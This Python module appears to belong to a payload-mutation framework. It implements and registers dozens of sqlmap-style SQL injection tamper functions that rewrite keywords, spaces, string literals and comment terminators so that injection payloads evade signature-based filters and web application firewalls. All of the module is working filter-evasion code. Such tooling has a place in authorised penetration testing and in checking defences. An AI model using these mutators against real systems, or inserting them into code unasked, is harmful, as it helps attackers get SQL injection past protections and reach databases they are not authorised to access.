"""SQL Injection tamper techniques — modelled after sqlmap's tamper script
catalog. Each mutator rewrites tokens/whitespace/literals in a way that keeps
the statement semantically equivalent for most SQL dialects while breaking
naive signature matching.
"""
from __future__ import annotations

import re

from .base import REGISTRY

_SQL = {"SQL Injection", "NoSQL Injection"}

_KEYWORDS = (
    "UNION", "SELECT", "FROM", "WHERE", "AND", "OR", "ORDER", "BY",
    "GROUP", "HAVING", "INSERT", "UPDATE", "DELETE", "DROP", "TABLE",
    "LIMIT", "NULL", "LIKE", "BETWEEN", "CASE", "WHEN", "THEN",
)

_KEYWORD_RE = re.compile(
    r"\b(" + "|".join(_KEYWORDS) + r")\b", re.IGNORECASE
)


def _replace_keywords(s: str, repl) -> str:
    return _KEYWORD_RE.sub(lambda m: repl(m.group(0)), s)


def between_comment(s: str) -> str:
    """Insert /**/ between every keyword/token boundary."""
    return re.sub(r"\s+", "/**/", s)


def versioned_comment(s: str) -> str:
    """MySQL version-gated comment around every keyword: SELECT -> /*!50000SELECT*/."""
    return _replace_keywords(s, lambda kw: f"/*!50000{kw}*/")


def versioned_comment_mssql(s: str) -> str:
    """Generic inline comment immediately after each keyword (MSSQL/Oracle safe)."""
    return _replace_keywords(s, lambda kw: f"{kw}/**/")


def keyword_case_random(s: str) -> str:
    """Deterministic mixed-case for SQL keywords: SeLeCt."""
    def mix(kw: str) -> str:
        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(kw))
    return _replace_keywords(s, mix)


def space_to_mysql_comment(s: str) -> str:
    """Spaces -> MySQL inline comment /**/."""
    return s.replace(" ", "/**/")


def space_to_vtab(s: str) -> str:
    """Spaces -> vertical tab %0b (MySQL treats as whitespace)."""
    return s.replace(" ", "%0b")


def space_to_nbsp(s: str) -> str:
    """Spaces -> non-breaking space %a0."""
    return s.replace(" ", "%a0")


def space_to_tab_url(s: str) -> str:
    """Spaces -> horizontal tab %09."""
    return s.replace(" ", "%09")


def space_to_formfeed(s: str) -> str:
    """Spaces -> form feed %0c."""
    return s.replace(" ", "%0c")


def space_to_plus(s: str) -> str:
    """Spaces -> '+' (decoded as space by many query parsers)."""
    return s.replace(" ", "+")


def space_to_parens(s: str) -> str:
    """Spaces around keywords removed/replaced using parenthesis grouping."""
    out = s.replace(" AND ", ")AND(").replace(" and ", ")and(")
    out = out.replace(" OR ", ")OR(").replace(" or ", ")or(")
    return out


def equal_to_like(s: str) -> str:
    """'=' -> ' LIKE ' (valid for string/numeric equality in most dialects)."""
    return re.sub(r"(?<=\w)\s*=\s*(?=[\w'\"])", " LIKE ", s)


def equal_to_between(s: str) -> str:
    """'col=1' style numeric equality -> BETWEEN 1 AND 1."""
    return re.sub(r"(\d+)\s*=\s*(\d+)", r"\1 BETWEEN \2 AND \2", s)


def and_to_ampamp(s: str) -> str:
    """' AND ' -> ' && ' (MySQL operator form)."""
    return re.sub(r"\bAND\b", "&&", s, flags=re.IGNORECASE)


def or_to_pipepipe(s: str) -> str:
    """' OR ' -> ' || ' (MySQL/Oracle operator form)."""
    return re.sub(r"\bOR\b", "||", s, flags=re.IGNORECASE)


def string_to_char_concat(s: str) -> str:
    """Rebuild single-quoted string literals using CHAR()/concat()."""
    def repl(m: re.Match) -> str:
        literal = m.group(1)
        if not literal:
            return "''"
        codes = ",".join(str(ord(c)) for c in literal)
        return f"CHAR({codes})"
    return re.sub(r"'([^']*)'", repl, s)


def string_to_hex(s: str) -> str:
    """Rebuild single-quoted string literals as 0x-prefixed hex (MySQL)."""
    def repl(m: re.Match) -> str:
        literal = m.group(1)
        return "0x" + literal.encode().hex()
    return re.sub(r"'([^']*)'", repl, s)


def string_concat_plus(s: str) -> str:
    """Split a single-quoted literal into two concatenated pieces (MSSQL +)."""
    def repl(m: re.Match) -> str:
        literal = m.group(1)
        if len(literal) < 2:
            return m.group(0)
        mid = len(literal) // 2
        return f"'{literal[:mid]}'+'{literal[mid:]}'"
    return re.sub(r"'([^']*)'", repl, s)


def string_concat_pipe(s: str) -> str:
    """Split a single-quoted literal using Oracle/Postgres || concatenation."""
    def repl(m: re.Match) -> str:
        literal = m.group(1)
        if len(literal) < 2:
            return m.group(0)
        mid = len(literal) // 2
        return f"'{literal[:mid]}'||'{literal[mid:]}'"
    return re.sub(r"'([^']*)'", repl, s)


def nested_parens(s: str) -> str:
    """Wrap numeric comparisons in redundant nested parentheses."""
    return re.sub(r"(\d+)\s*=\s*(\d+)", r"((\1)=(\2))", s)


def scientific_notation(s: str) -> str:
    """Numeric literals -> scientific notation equivalents (1 -> 1e0)."""
    return re.sub(r"(?<![\w.])(\d+)(?![\w.eE])", lambda m: f"{m.group(1)}e0", s)


def backtick_wrap_identifiers(s: str) -> str:
    """Wrap bare SQL keywords in backticks (MySQL identifier quoting trick)."""
    return _replace_keywords(s, lambda kw: f"`{kw}`")


def double_encode_keywords(s: str) -> str:
    """Percent-double-encode the first letter of each keyword to dodge literal match."""
    def repl(kw: str) -> str:
        first = f"%{ord(kw[0]):02x}"
        first = f"%25{first[1:]}"
        return first + kw[1:]
    return _replace_keywords(s, repl)


def comment_hash_terminator(s: str) -> str:
    """Trailing '-- -' style terminators -> '#' (MySQL alt end-of-line comment)."""
    return re.sub(r"--\s*-?$", "#", s.rstrip())


def multiline_comment_terminator(s: str) -> str:
    """Trailing line comment -> balanced /* */ terminator."""
    return re.sub(r"--\s*-?$", "/**/", s.rstrip())


def unionselect_collapse(s: str) -> str:
    """'UNION SELECT' -> 'UNION(SELECT' with trailing ')' (parenthesized subselect)."""
    return re.sub(r"\bUNION\s+SELECT\b", "UNION(SELECT", s, flags=re.IGNORECASE) + (
        ")" if re.search(r"\bUNION\s+SELECT\b", s, re.IGNORECASE) else ""
    )


def quote_to_doubled(s: str) -> str:
    """Escape single quotes by doubling (dialect-safe quote escaping)."""
    return s.replace("'", "''")


def _register() -> None:
    R = REGISTRY
    R.add("sql_between_comment", between_comment, "obfuscator",
          "collapse all whitespace into /**/ comments", classes=_SQL)
    R.add("sql_versioned_comment_mysql", versioned_comment, "obfuscator",
          "MySQL /*!50000KEYWORD*/ version-gated comments", classes=_SQL)
    R.add("sql_versioned_comment_generic", versioned_comment_mssql, "obfuscator",
          "inline comment immediately after each keyword", classes=_SQL)
    R.add("sql_keyword_case_random", keyword_case_random, "obfuscator",
          "mixed-case SQL keywords (SeLeCt)", classes=_SQL)
    R.add("sql_space_mysql_comment", space_to_mysql_comment, "obfuscator",
          "spaces -> /**/", classes=_SQL)
    R.add("sql_space_vtab", space_to_vtab, "encoder",
          "spaces -> %0b vertical tab", classes=_SQL)
    R.add("sql_space_nbsp", space_to_nbsp, "encoder",
          "spaces -> %a0 non-breaking space", classes=_SQL)
    R.add("sql_space_tab", space_to_tab_url, "encoder",
          "spaces -> %09 horizontal tab", classes=_SQL)
    R.add("sql_space_formfeed", space_to_formfeed, "encoder",
          "spaces -> %0c form feed", classes=_SQL)
    R.add("sql_space_plus", space_to_plus, "encoder",
          "spaces -> '+'", classes=_SQL)
    R.add("sql_space_parens", space_to_parens, "obfuscator",
          "AND/OR -> )AND(/)OR( parenthesis grouping", classes=_SQL)
    R.add("sql_equal_to_like", equal_to_like, "obfuscator",
          "'=' -> ' LIKE '", classes=_SQL)
    R.add("sql_equal_to_between", equal_to_between, "obfuscator",
          "numeric '=' -> BETWEEN x AND x", classes=_SQL)
    R.add("sql_and_to_ampamp", and_to_ampamp, "obfuscator",
          "AND -> &&", classes=_SQL)
    R.add("sql_or_to_pipepipe", or_to_pipepipe, "obfuscator",
          "OR -> ||", classes=_SQL)
    R.add("sql_string_char_concat", string_to_char_concat, "obfuscator",
          "string literal -> CHAR(...) rebuild", classes=_SQL)
    R.add("sql_string_hex", string_to_hex, "obfuscator",
          "string literal -> 0x-hex (MySQL)", classes=_SQL)
    R.add("sql_string_concat_plus", string_concat_plus, "obfuscator",
          "string literal split and + concatenated (MSSQL)", classes=_SQL)
    R.add("sql_string_concat_pipe", string_concat_pipe, "obfuscator",
          "string literal split and || concatenated (Oracle/PG)", classes=_SQL)
    R.add("sql_nested_parens", nested_parens, "obfuscator",
          "wrap numeric comparisons in redundant parens", classes=_SQL)
    R.add("sql_scientific_notation", scientific_notation, "obfuscator",
          "integer literals -> scientific notation (1 -> 1e0)", classes=_SQL)
    R.add("sql_backtick_identifiers", backtick_wrap_identifiers, "obfuscator",
          "wrap keywords in backticks (MySQL identifier quoting)", classes={"SQL Injection"})
    R.add("sql_double_encode_keyword", double_encode_keywords, "encoder",
          "double percent-encode first char of each keyword", classes=_SQL)
    R.add("sql_comment_hash_terminator", comment_hash_terminator, "obfuscator",
          "'-- -' terminator -> '#'", classes={"SQL Injection"})
    R.add("sql_comment_multiline_terminator", multiline_comment_terminator, "obfuscator",
          "'-- -' terminator -> balanced /* */", classes=_SQL)
    R.add("sql_unionselect_collapse", unionselect_collapse, "obfuscator",
          "UNION SELECT -> UNION(SELECT ...)", classes={"SQL Injection"})
    R.add("sql_quote_doubled", quote_to_doubled, "obfuscator",
          "escape single quotes by doubling", classes=_SQL)


_register()
